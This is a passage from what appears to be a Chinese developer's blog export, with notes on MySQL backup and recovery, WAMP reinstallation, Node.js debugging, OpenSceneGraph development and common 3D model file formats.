<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 备份全部数据库（包含存储过程、自定义函数及事件） </span><br><span class="line">mysqldump -uroot -p --single-transaction -R -E --all-databases &gt; &#x2F;tmp&#x2F;all_database.sql </span><br><span class="line"></span><br><span class="line"># 备份指定数据库 </span><br><span class="line">mysqldump -uroot -p --single-transaction -R -E --databases db1 &gt; &#x2F;tmp&#x2F;db1.sql </span><br><span class="line">mysqldump -uroot -p --single-transaction -R -E --databases db1 db2 &gt; &#x2F;tmp&#x2F;db1_db2.sql </span><br><span class="line"></span><br><span class="line"># 备份部分表 </span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 &gt; &#x2F;tmp&#x2F;tb1.sql </span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 tb2 tb3 &gt; &#x2F;tmp&#x2F;tb.sql</span><br></pre></td></tr></table></figure>

<p><strong>注意：一定要先修复再备份，防止备份数据时因页表错误丢失数据。</strong></p>
<p>完成修复备份后，注释my.ini中innodb_force_recovery，再重启mysql数据库后台服务，如果成功，则修复完成。如果未成功，则准备利用备份数据重建数据库。</p>
<h3 id="wamp备份修复"><a href="#wamp备份修复" class="headerlink" title="wamp备份修复"></a>wamp备份修复</h3><p>当mysql遭遇严重错误，修复备份后仍然不能启动，可考虑重装wamp。具体操作如下：</p>
<ul>
<li>备份整个wamp文件夹，以便保留mysql数据库文件、apache、php关键配置文件等。</li>
<li>重装wamp后，重建mysql数据库，重设apache、php关键配置，参考之前备份的wamp文件夹</li>
<li>apache主要配置httpd.conf和httpd-vhost.conf，设置documentroot和vhost</li>
<li>php主要配置php.ini文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 针对mysql 8.0.18，使用如下命令修改root密码</span><br><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;</span><br><span class="line"></span><br><span class="line"># 通过增加参数 --default-character-set &#x3D; utf8 解决乱码问题</span><br><span class="line">mysql -u root -p &lt; path_to_import_file --default-character-set &#x3D; utf8</span><br></pre></td></tr></table></figure>

<p>重装后配置遇到的问题请参考：</p>
<ul>
<li><a href="https://www.programminghunter.com/article/932374354/" target="_blank" rel="noopener">关于Apache本地能访问外网不能访问的问题</a></li>
<li><a href="https://www.quyu.net/info/85.html" target="_blank" rel="noopener">php中的时区设置和php.ini中配置时区的方法</a></li>
<li><a href="https://developer.aliyun.com/article/433022" target="_blank" rel="noopener">设置修改 Apache 文件根目录 (Document Root)</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.sudops.com/mysql-innodb-crash-recover.html" target="_blank" rel="noopener">mysql InnoDB crash and recover</a>,by Fisher.</li>
<li><a href="https://www.cnblogs.com/glon/p/6728380.html" target="_blank" rel="noopener">利用 Forcing InnoDB Recovery 特性解决 MySQL 重启失败的问题</a>,by GlonHo.</li>
<li><a href="https://blog.csdn.net/L835311324/article/details/86767895" target="_blank" rel="noopener">INFORMATION_SCHEMA获取元数据</a>,by 十五十六.</li>
<li><a href="https://www.51cto.com/article/672563.html" target="_blank" rel="noopener">MySQLDump的备份小技巧</a>,by MySQL技术.</li>
<li><a href="https://www.cnblogs.com/bolang100/p/10755538.html" target="_blank" rel="noopener">MYSQL 自带4个默认数据库</a>,by bolang100.</li>
<li><a href="https://wokan.chawen.org/post/918" target="_blank" rel="noopener">wamp设置mysql8.0.18初始密码问题</a>,by PHPer.</li>
<li><a href="https://segmentfault.com/a/1190000020339810" target="_blank" rel="noopener">MySQL字符集和排序规则</a>,by 流逝的傷.</li>
<li><a href="https://www.programminghunter.com/article/932374354/" target="_blank" rel="noopener">关于Apache本地能访问外网不能访问的问题</a>,by programminghunter.</li>
<li><a href="https://www.quyu.net/info/85.html" target="_blank" rel="noopener">php中的时区设置和php.ini中配置时区的方法</a>,by quyu.</li>
<li><a href="https://developer.aliyun.com/article/433022" target="_blank" rel="noopener">设置修改 Apache 文件根目录 (Document Root)</a>,by needrunning.</li>
<li><a href="https://blog.csdn.net/u013967628/article/details/80633790" target="_blank" rel="noopener">windows 下自动备份mysql数据库，删除以前的数据库文件</a>,by 森林屿麓.</li>
<li><a href="https://www.cnblogs.com/lkj371/p/15179949.html" target="_blank" rel="noopener">windows下mysql自动备份脚本</a>,by 雪竹子.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>OSG_HUD实现方法</title>
    <url>/2022/09/26/OSG-HUD%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>HUD (Head Up Display, 抬头显示器)，相机的一种，好比英雄联盟的小地图。</p>
<p align="center">
    <img src="https://img-blog.csdn.net/20170831140052136" width="50%" alt="HUD渲染流程流程"/>
</p>
<center>图1 HUD渲染流程流程</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.i4k.xyz/article/MissXy_/77745653" target="_blank" rel="noopener">OSG HUD (渲染屏幕上贴图和写字)</a>,by MissXy.</li>
<li><a href="https://osg3.readthedocs.io/en/latest/ch07.html" target="_blank" rel="noopener">Chapter 7: Viewing the World</a>,by osg3.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Nodejs调试入门</title>
    <url>/2019/07/31/Nodejs%E8%B0%83%E8%AF%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>调试是每个程序员必备的技能，因此选择合适的调试工具能极大地方便我们调试代码。Node.js 的调试方式也有很多，常见的有：</p>
<ol>
<li>万能的 console.log</li>
<li>debugger</li>
<li>node –inspect + chrome devtools</li>
</ol>
<p>本文重点介绍最有用的node –inspect方法。具体步骤如下：</p>
<ol>
<li>node –inspect app.js</li>
<li>打开 Chrome 浏览器，访问 chrome://inspect，选择第一步的调试目标。</li>
<li>在chrome访问源代码，设置断点调试。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/nswbmw/node-in-debugging" target="_blank" rel="noopener">《Node.js 调试指南》</a>,by nswbmw.</li>
<li><a href="https://blog.devgenius.io/13-heart-pounding-node-js-libraries-to-ignite-your-next-project-94ee989203b9" target="_blank" rel="noopener">Node.js Power Tools: 13 Libraries Every Developer Should Know</a>,by Pinjari Rehan.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>OSG中的OpenThreads库使用帮助</title>
    <url>/2021/12/24/OSG%E4%B8%AD%E7%9A%84OpenThreads%E5%BA%93%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>OpenThreads库是一个轻量级的跨平台多线程库，在2.x之前是独立发展的一个库，在2.x后并入到OSG的源码中，OSG中大量的多线程操作都是基于这个库编写的。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/79551251" target="_blank" rel="noopener">OpenThreads库介绍——Thread</a>,by csxiaoshui.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/79555524" target="_blank" rel="noopener">OpenThreads库介绍——Mutex</a>,by csxiaoshui.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/79564334" target="_blank" rel="noopener">OpenThreads库介绍——Block</a>,by csxiaoshui.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>OSG学习笔记</title>
    <url>/2021/03/17/OSG%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>OpenSceneGraph是一个开源3D图形应用程序编程接口，应用程序开发人员在诸如视觉模拟，计算机游戏，虚拟现实，科学可视化和建模等领域中使用该接口。</p>
<h1 id="OSG-编译运行问题"><a href="#OSG-编译运行问题" class="headerlink" title="OSG 编译运行问题"></a>OSG 编译运行问题</h1><h2 id="OSG指出GL版本问题"><a href="#OSG指出GL版本问题" class="headerlink" title="OSG指出GL版本问题"></a>OSG指出GL版本问题</h2><p>CMake设置了GL3的开关，结果编译完后，好多例子无法正常运行。</p>
<p>原因：GL3对GL1、GL2不兼容</p>
<p>解决办法：去掉GL3选项</p>
<p>GL3(3.3)，属于OpenGL的高版本驱动所支持的接口，需要完全使用可编程管线.</p>
<p>不开启GL3设置，其实也可以使用GL3的特性，论坛作者提到osg使用了兼容模式，编写OpenGL3.3以上着色器，配置兼容模式即可使用。</p>
<p>获取OSG指出的OpengGL版本，可参考<a href="https://vicrucann.github.io/tutorials/osg-version-opengl/" target="_blank" rel="noopener">How to obtain OpenGL version from within OpenSceneGraph</a>。</p>
<h2 id="OSG运行的坑：WINGDIAPI（GL-h"><a href="#OSG运行的坑：WINGDIAPI（GL-h" class="headerlink" title="OSG运行的坑：WINGDIAPI（GL.h)"></a>OSG运行的坑：WINGDIAPI（GL.h)</h2><p>在VS运行OSG程序时，要将预处理器设置为WIN32，否则GL.h头文件会报错。</p>
<h2 id="osg键盘事件不响应的解决方法"><a href="#osg键盘事件不响应的解决方法" class="headerlink" title="osg键盘事件不响应的解决方法"></a>osg键盘事件不响应的解决方法</h2><p>1、换输入法为英文状态<br>2、（若1不行）换键盘为美式键盘</p>
<h2 id="osgQt键盘事件不响应的解决方法"><a href="#osgQt键盘事件不响应的解决方法" class="headerlink" title="osgQt键盘事件不响应的解决方法"></a>osgQt键盘事件不响应的解决方法</h2><p>请参考<a href="https://blog.csdn.net/ljt_229/article/details/124803919" target="_blank" rel="noopener">osg嵌入Qt后，键盘响应以及程序退出崩溃问题解决</a>。</p>
<h1 id="OSG开发技巧"><a href="#OSG开发技巧" class="headerlink" title="OSG开发技巧"></a>OSG开发技巧</h1><h2 id="OpenGL中的功能与OSG对应功能"><a href="#OpenGL中的功能与OSG对应功能" class="headerlink" title="OpenGL中的功能与OSG对应功能"></a>OpenGL中的功能与OSG对应功能</h2><h2 id="OSG-调试"><a href="#OSG-调试" class="headerlink" title="OSG 调试"></a>OSG 调试</h2><p>打开cmd，输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET OSG_NOTIFY_LEVEL&#x3D;DEBUG</span><br><span class="line">osgviewer cow.osgt</span><br></pre></td></tr></table></figure>

<h2 id="坐标系"><a href="#坐标系" class="headerlink" title="坐标系"></a>坐标系</h2><p>OSG中采用的X轴正方向向右，Y轴正方向朝里，Z轴正方向向上。</p>
<p>OpenGL中采用的X轴正方向向右，Y轴正方向朝上，Z轴正方向朝外。</p>
<p align="center">
    <img src="images/axis.jpg" width="80%" alt="OSG与OpenGL坐标系"/>
</p>
<center>图1 OSG与OpenGL坐标系</center>

<h2 id="显示模型坐标轴"><a href="#显示模型坐标轴" class="headerlink" title="显示模型坐标轴"></a>显示模型坐标轴</h2><p>使用如下命令显示模型坐标轴：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">osgviewer cessna.osgt axes.osgt</span><br></pre></td></tr></table></figure>

<h2 id="OSG相机默认视角"><a href="#OSG相机默认视角" class="headerlink" title="OSG相机默认视角"></a>OSG相机默认视角</h2><p>osg::Camare的默认姿态：</p>
<ul>
<li>位置在 0,0,0</li>
<li>姿态是：向下看（Z轴负向 0,0,-1）</li>
<li>头向前（Y轴正向 0,1,0，也就是说相机是正着的）</li>
</ul>
<h2 id="OSG渲染状态管理"><a href="#OSG渲染状态管理" class="headerlink" title="OSG渲染状态管理"></a>OSG渲染状态管理</h2><blockquote>
<p>OpenGL是一个状态机，在OpenGL中如果设置一种状态（比如设置当前的绘制颜色：glColor，那么实际上是设置了OpenGL颜色绘制状态为某种颜色，如果后续没有调用glColor去修改颜色，那么之后所有绘制的对象都使用之前设置的颜色。），在没有修改它的时候，该状态就会一直保持。在OpenGL使用中的状态有以下两种方式：</p>
</blockquote>
<ul>
<li><p>仅仅通过glEnable和glDisable开启和关闭状态<br>这里面也有两种不同的取值：</p>
<ul>
<li>1.1 不涉及和其他状态相关，比如GL_DITHER、GL_POINT_SPRITE等；</li>
<li>1.2 涉及和其他状态的联动，比如GL_ALPHA_TEST、GL_BLEND等，需要使用glEnable开启状态</li>
</ul>
</li>
<li><p>和1.2种的某种状态对应，但是需要设置状态的值（比如glAlphaFunc、glBlendFunc）</p>
</li>
</ul>
<p>在OSG中对OpenGL的状态进行了封装，在OSG中称第一种情形为Mode（模式），称第二种情况为Attribute（属性），使用osg::StateAttribute来封装OpenGL的状态。</p>
<p>在OSG中涉及到状态管理的类有3个，分别是 osg::State， osg::StateSet， osg::StateAttribute。</p>
<h2 id="OSG渲染"><a href="#OSG渲染" class="headerlink" title="OSG渲染"></a>OSG渲染</h2><p>OSG可以使得绘制遍历，也就是将数据传送给OpenGL管线，在一个单独的线程中运行。他必须与每一帧中的其他绘制遍历相同步，但是绘制遍历的部分可以与来自下一帧的更新遍历相重叠，从而改善渲染效率并减少帧延迟。这意味着osgViewer::Viewer的frame()方法会在绘制工作依然处于活动状态时返回。那么更新回调中的数据变化也许会与未完成的渲染操作相冲突，从而导致不可预期的行为，甚至崩溃。</p>
<p>OSG在setDataVariance()方法中提供了解决方法，该方法属于osg::Object类，这是所有场景对象的基类。这可以设置为三个枚举值之一：UNSPECIFIED（默认），STATIC与DYNAMIC。场景图中的DYNAMIC对象必须在绘制遍历的开始进行处理。也就是，渲染后端应确保所有节点以及被指定为DYNAMIC的场景对象在下一帧的更新与裁剪遍历开始之前已完成绘制。然而，STATIC对象，在更新与绘制过程中会保持不变，从而会被稍后渲染且不会阻塞帧速率。</p>
<h2 id="Object-DataVariance"><a href="#Object-DataVariance" class="headerlink" title="Object::DataVariance"></a>Object::DataVariance</h2><p>要设置一个Object 对象的数据变量，可以调用setDataVariance()并设置输入参数为Object::DataVariance 枚举量。初始状态下，变度的值是UNSPECIFIED。用户程序可以将数据变度更改为STATIC 或者DYNAMIC。OSG 将确保绘制遍历在所有的DYNAMIC 节点和数据处理完成后才会返回。</p>
<p>场景数据动态更新的核心就是设置数据变度属性DataVariance，它决定了OSG在多线程渲染的过程中的执行策略：只有所有DYNAMIC属性的对象被渲染完毕之后，OSG才会开始执行下一帧的用户更新操作；这样有效地可以避免数据的过快更新造成当前的渲染动作出错，以致系统崩溃。</p>
<h2 id="OSG绘制几何体"><a href="#OSG绘制几何体" class="headerlink" title="OSG绘制几何体"></a>OSG绘制几何体</h2><p>默认情况下，OSG使用顶点数组与显示列表来管理与渲染几何。然而，这会依据不同的数据类型与渲染策略而发生变化。</p>
<h2 id="OSG矩阵相乘"><a href="#OSG矩阵相乘" class="headerlink" title="OSG矩阵相乘"></a>OSG矩阵相乘</h2><p>OSG使用行向量与行为主矩阵在右侧原则（right-hand rule）下来执行前相乘（vector<em>matrix）。然而，OpenGL使用列为主矩阵与列向量来执行后相乘（matrix</em>vector）。</p>
<h2 id="OSG节点的增加-删除-隐藏和开关"><a href="#OSG节点的增加-删除-隐藏和开关" class="headerlink" title="OSG节点的增加,删除,隐藏和开关"></a>OSG节点的增加,删除,隐藏和开关</h2><p>osg::Switch 从osg::Group继承而来，是一个管理类，除了可以当成osg::Group使用外，它还可以控制子类的显示与隐藏, 这种隐藏是不耗费内存的，与 SetNodeMask对比有明显的优势，SetNodeMask只是隐藏了结点，但结点仍被绘制。</p>
<h2 id="OSG纹理"><a href="#OSG纹理" class="headerlink" title="OSG纹理"></a>OSG纹理</h2><p>osg::Texture2D类要求纹理坐标正规化为[0,1]，否则他会使用纹理封装来处理多余的部分。他会检测纹理的维度在尺寸上是否全部为2的幂次，例如64x64或256x512，并且在默认情况下会使用OpenGL的gluScaleImage()函数在内部缩放不是2的幂次的图像，这对于读取任意的图像非常方便，但是需要更多的系统时间并会占用较大的图形内存尺寸。</p>
<h2 id="OSG状态"><a href="#OSG状态" class="headerlink" title="OSG状态"></a>OSG状态</h2><p>正常情况下，节点的状态集将会影响当前节点及其子节点。例如，节点transformation1的osg::PolygonMode属性将会使得其所有子节点显示为轮廓图。然而，子节点的状态集可以覆盖父节点的状态集，也就是，渲染状态将会由父节点继承，除非子节点改变这一行为。</p>
<p>非正常情况下，父节点可以使用osg::StateAttribute::OVERRIDE标记，以强制其所有的子节点继承其属性或模式。子节点也可以使用osg::StateAttribute::PROTECTED标记，来改变其继承性，从而会导致不同的结果。</p>
<h2 id="OSG-Viewer"><a href="#OSG-Viewer" class="headerlink" title="OSG Viewer"></a>OSG Viewer</h2><p>osgViewer::View类是osgViewer::Viewer类的超类。他接受设置根节点作为场景数据，并添加相机操作器与事件处理器来使用用户事件。osgViewer::View与osgViewer::Viewer之间的区别在于前者不能被直接用作单个查看器，也就是，他没有run()或frame()方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">osgViewer::CompositeViewer multiviewer;</span><br><span class="line">multiviewer.addView( view );</span><br></pre></td></tr></table></figure>

<h2 id="OSG事件响应"><a href="#OSG事件响应" class="headerlink" title="OSG事件响应"></a>OSG事件响应</h2><p>可参考<a href="https://blog.csdn.net/analyst_yuci/article/details/17683447" target="_blank" rel="noopener">osg demo12 响应鼠标事件</a></p>
<h2 id="OSG多个着色器"><a href="#OSG多个着色器" class="headerlink" title="OSG多个着色器"></a>OSG多个着色器</h2><p>当OSG的父节点附加一个着色器，子节点附加另一个着色器会发生什么事情？</p>
<p>答案是子节点渲染时，其自身着色器会生效，而不会运行父节点着色器。</p>
<h2 id="3D模型转换"><a href="#3D模型转换" class="headerlink" title="3D模型转换"></a>3D模型转换</h2><p>osgconv是一种非常有用的的工具来读取标准的3D格式，如OpenFlight,3DS,Alias Wavefront<br>(OBJ) etc，并且可以将它们转换为一种OSG所支持的格式，如OSG中的ASCII格式的.osg，二进制格式的.ive。<br>在程序运行的默认情况下，优化导入的场景图，将形成的这样结果：场景图读取的数据量将会更少且速度会更<br>快。尤其值得指出的是，.ive格式的的文件，快速装载数据的能力使它非常适合数据页和大型的数据库。</p>
<p>使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">osgconv cow.obj cow.ive</span><br><span class="line">osgconv --compressed cow.obj cow.ive</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://en.wikipedia.org/wiki/OpenSceneGraph" target="_blank" rel="noopener">OpenSceneGraph</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/wang15061955806/article/details/49679731" target="_blank" rel="noopener">OSG渲染引擎架构——整体认识</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/74859066" target="_blank" rel="noopener">OSG渲染状态管理</a>,by csxiaoshui.</li>
<li><a href="https://www.codetd.com/en/article/13390663" target="_blank" rel="noopener">OSG中的DataVariance</a>,by codetd.</li>
<li><a href="https://www.cnblogs.com/lyggqm/p/12835518.html" target="_blank" rel="noopener">OpenGL中的功能与OSG对应功能</a>,by 南水之源.</li>
<li><a href="https://blog.csdn.net/u012209626/article/details/45750559" target="_blank" rel="noopener">OpenGL——颜色混合 glBlendFunc函数</a>,by Timidkid.</li>
<li><a href="https://blog.csdn.net/weixin_41623673/article/details/118112372" target="_blank" rel="noopener">OpenGL Display List学习</a>,by Antplay.</li>
<li><a href="https://blog.csdn.net/hankern/article/details/119746760" target="_blank" rel="noopener">osg学习（五十二）加载的牛模型cow.osg没有纹理 黑色</a>,by hankern.</li>
<li><a href="https://www.jianshu.com/p/6c37c4334c8f" target="_blank" rel="noopener">OSG仿真案例（4）——创建烟雾粒子效果</a>,by rexinx.</li>
<li><a href="https://www.cnblogs.com/wanfu/p/3912896.html" target="_blank" rel="noopener">OSG中的DataVariance</a>,by sunflower_cs.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/74859066" target="_blank" rel="noopener">OSG渲染状态管理</a>,by csxiaoshui.</li>
<li><a href="https://stackoverflow.com/questions/66356998/openscenegraph-plugin-not-included-in-conan" target="_blank" rel="noopener">OpenSceneGraph plugin not included in Conan?</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/23434593" target="_blank" rel="noopener">osg示例解析之osgparticle(1)</a> ,by csxiaoshui.</li>
<li><a href="https://learnopengl-cn.github.io/" target="_blank" rel="noopener">欢迎来到OpenGL的世界</a>,by learnopengl.</li>
<li><a href="https://blog.csdn.net/qq_35097289/article/details/83892294" target="_blank" rel="noopener">OSG调试经验</a>,by 醉逍遥_祥.</li>
<li><a href="https://blog.csdn.net/qq_16123279/article/details/82463266" target="_blank" rel="noopener">OSG使用GLSL各个版本例子</a>,by 封狼居胥_COU.</li>
<li><a href="https://blog.csdn.net/less_stronger/article/details/120404278" target="_blank" rel="noopener">OSG运行的坑：WINGDIAPI（GL.h)</a>,by lessssssss.</li>
<li><a href="https://www.twblogs.net/a/5bddbec52b717720b51ac027/?lang=zh-cn" target="_blank" rel="noopener">OSG 3.6.3 版本编译一些问题</a>,by longlongway2012.</li>
<li><a href="https://zhuanlan.zhihu.com/p/539708040" target="_blank" rel="noopener">01-01-osg下GL3环境搭建</a>,by Longlongwaytogo.</li>
<li><a href="https://www.cnblogs.com/xiaocainiao2hao/p/5619935.html" target="_blank" rel="noopener">OSG报警特效学习总结 </a>,by JosephDcc.</li>
<li><a href="https://blog.csdn.net/Rsoftwaretest/article/details/93033015" target="_blank" rel="noopener">OSG 绘制Geometry使用</a>,by jdq0603.</li>
<li><a href="https://xiaobazhang.github.io/2016/07/31/OSG-coordinate/" target="_blank" rel="noopener">OSG三维渲染引擎–OSG渲染引擎中坐标系</a>,by 苏黎.</li>
<li><a href="https://vicrucann.github.io/tutorials/osg-version-opengl/" target="_blank" rel="noopener">How to obtain OpenGL version from within OpenSceneGraph</a>,by Victoria Rudakova.</li>
<li><a href="https://blog.csdn.net/less_stronger/article/details/120404278" target="_blank" rel="noopener">OSG运行的坑：WINGDIAPI（GL.h)</a>,by lessssssss.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/78136677" target="_blank" rel="noopener">OSG可绘制体Drawable</a>,by csxiaoshui.</li>
<li><a href="https://blog.csdn.net/fatcat123/article/details/89884378" target="_blank" rel="noopener">OSG 渲染剖析 之 Geometry 的 VBO生成</a>,by Night_Aurora.</li>
<li><a href="https://blog.51cto.com/u_15127658/3685658" target="_blank" rel="noopener">osg绘制四边形</a>,by mob60475700473b.</li>
<li><a href="https://blog.csdn.net/kasteluo/article/details/80807099" target="_blank" rel="noopener">osg setRenderBinDetails 使用</a>,by longlongway2012.</li>
<li><a href="https://blog.csdn.net/niu2212035673/article/details/75179990" target="_blank" rel="noopener">ogs节点的增加,删除,隐藏和开关</a>,by 先锋小牛.</li>
<li><a href="https://blog.csdn.net/analyst_yuci/article/details/17683447" target="_blank" rel="noopener">osg demo12 响应鼠标事件</a>,by analyst_yuci.</li>
<li><a href="https://groups.google.com/g/osg-users/c/pfogR_RSYl4" target="_blank" rel="noopener">[osg-users] Multiple Shaders</a>,by J. Brent Spears.</li>
<li><a href="https://my.oschina.net/u/235558/blog/3093054" target="_blank" rel="noopener">OSG 中默认的 Shader</a>,by 洛克人杰洛.</li>
<li><a href="https://www.cnblogs.com/mazhenyu/p/5995519.html" target="_blank" rel="noopener">osgconv使用指南(转)</a>,by 3D入魔.</li>
<li><a href="https://blog.csdn.net/ljt_229/article/details/124803919" target="_blank" rel="noopener">osg嵌入Qt后，键盘响应以及程序退出崩溃问题解决</a>,by 程序开发园.</li>
<li><a href="https://blog.csdn.net/wb175208/article/details/87986017" target="_blank" rel="noopener">OSG相机</a>,by wb175208.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>OSG中GLB转IVE之路</title>
    <url>/2022/01/20/OSG%E4%B8%ADGLB%E8%BD%ACIVE%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>最近在使用OSG 3.4的过程中，需要将一个GLB格式的3D模型文件，转换成IVE格式，以便osgDB::readNodeFile函数加载。具体方法是通过Blender建模软件进行3D文件格式转换。这个过程中遇到很多问题，记录一下。</p>
<h1 id="常用的3D文件格式"><a href="#常用的3D文件格式" class="headerlink" title="常用的3D文件格式"></a>常用的3D文件格式</h1><h2 id="obj"><a href="#obj" class="headerlink" title=".obj"></a>.obj</h2><p>OBJ文件是Alias | Wavefront公司为它的一套基于工作站的3D建模和动画软件“AdvancedVisualizer”开发的一种标准3D模型文件格式。</p>
<p>应用OBJ文件一般包括三个子文件，分别是.obj、.mtl、.jpg，除了模型文件，还需要.jpg纹理文件。OBJ可以是传统模型，也可以是倾斜模型。</p>
<p>特点OBJ格式适合用于3D软件模型之间的互导。比如Smart3D里面生成的模型需要修饰，就可以输出OBJ格式，然后导入到3dsMax进行处理；如果你想把在3dsMax中建的模型调到Maya里面渲染或制作动画，导出OBJ文件就是一种很好的选择。</p>
<p>目前几乎所有知名的3D软件都支持OBJ文件的读写，不过其中很多需要通过插件才能实现。另外，OBJ文件还是一种文本文件，可以直接用写字板打开进行查看和编辑修改。值得一提的是，老子云平台能够支持OBJ格式数据的上传和OBJ格式与其它格式间的互转。</p>
<p>其特点如下：</p>
<ul>
<li><p>OBJ文件是一种3D模型文件。不包含动画、材质特性、贴图路径、动力学、粒子等信息。</p>
</li>
<li><p>OBJ文件主要支持多边形(Polygons)模型。虽然也支持曲线(Curves)、表面(Surfaces)、点组材质(Point Group Materials)，但Maya导出的OBJ文件并不包括这些信息。</p>
</li>
<li><p>OBJ文件支持法线和贴图坐标。OBJ只能保存贴图坐标信息，贴图需要手动重新指认，但不需要再调整贴图坐标。</p>
</li>
</ul>
<h2 id="dae"><a href="#dae" class="headerlink" title=".dae"></a>.dae</h2><p>COLLADA ( COLLA borative Design A ctivity ) 是一种用于交互式3D应用程序的交换文件格式。它由非营利性技术联盟Khronos Group管理，并已被 ISO 采用为公开可用的规范 ISO/PAS 17506。[1]</p>
<p>COLLADA 定义了一个开放的标准 XML 模式，用于在各种图形软件应用程序之间交换数字资产，否则这些应用程序可能会将其资产存储在不兼容的文件格式中。描述数字资产的 COLLADA 文档是 XML 文件，通常以.dae（数字资产交换）文件扩展名标识。</p>
<h2 id="fbx"><a href="#fbx" class="headerlink" title=".fbx"></a>.fbx</h2><p>FBX是FilmBoX软件中所使用的格式，后来这一软件改名为Motionbuilder。</p>
<p>应用因为Motionbuilder扮演的是动作制作平台，所以FBX格式最大的用途是在3dsMax、Maya、softimage等软件间进行模型、材质、动作和摄影机信息的互导，这样就可以发挥max和maya等各个软件的优势。可以说，<strong>FBX方案是最好的互导方案。</strong></p>
<p>其优点如下：</p>
<ul>
<li><p>FBX格式是一种3D通用模型文件。包含动画、材质特性、贴图、骨骼动画、灯光、摄像机等信息。</p>
</li>
<li><p>FBX格式支持多边形(Polygons)游戏模型、曲线(Curves)、表面(Surfaces)、点组材质（Point Group Materials）。</p>
</li>
<li><p>FBX格式支持法线和贴图坐标。贴图以及坐标信息都可以存入FBX文件中，文件导入后不需要手动指认贴图以及调整贴图坐标。</p>
</li>
</ul>
<h2 id="gltf-和-glb"><a href="#gltf-和-glb" class="headerlink" title=".gltf 和 .glb"></a>.gltf 和 .glb</h2><p>glTF（ Graphics Language Transmission Format或GL Transmission Format的衍生简称）是三维场景和模型的标准文件格式。glTF 文件使用两种可能的文件扩展名之一，.gltf ( JSON / ASCII ) 或 .glb ( binary )。.gltf 文件可以是自包含的，也可以引用外部二进制和纹理资源，而 .glb 文件是完全自包含的。Khronos Group开发和维护的开放标准，支持3D 模型几何、外观、场景图层次结构和动画。它旨在成为一种简化的、可互操作的格式，用于交付 3D 资产，同时最大限度地减少文件大小和应用程序的运行时处理。因此，其创建者将其描述为“ 3D JPEG ”。</p>
<p>应用GlTF是一种可以减少3D格式中与渲染无关的冗余数据并且在更加适合OpenGL簇加载的一种3D文件格式。GlTF的提出是源自于3D工业和媒体发展的过程中，对3D格式统一化的急迫需求。如果用一句话来描述：GlTF 就是三维文件的 JPEG ，三维格式的 MP3。在没有GlTF的时候，大家都要花很长的的时间来处理模型的载入。尽管一些3D Web框架支持特定于平台的模型格式，如FBX和OBJ，但几乎每个框架都支持GLTF。如果有人要为你提供3D模型，你可以请求他们提供GLTF格式的版本。</p>
<p>特点GLTF是一种输出格式，这意味着我们无法直接修改它们。但我们可以修改其位置和大小，并对其进行旋转操作。</p>
<p>另外，GLTF文件不是单个文件，而是包含JSON文档、图片、几何图形、纹理、凹凸贴图等的文件夹。</p>
<h2 id="OSGB"><a href="#OSGB" class="headerlink" title=".OSGB"></a>.OSGB</h2><p>OSGB的全称是Open Scene Gragh Binary。这里的Binary是二进制的意思。</p>
<p>应用目前市面上生产的倾斜模型，尤其是Smart3D处理的倾斜摄影三维模型的数据组织方式一般是二进制存贮的、带有嵌入式链接纹理数据（.jpg）的OSGB格式。</p>
<p>特点此类数据文件碎、数量多、高级别金字塔文件大。因而难以形成高效、标准的网络发布方案，无法实现不同地域、不同部门之间的数据共享。</p>
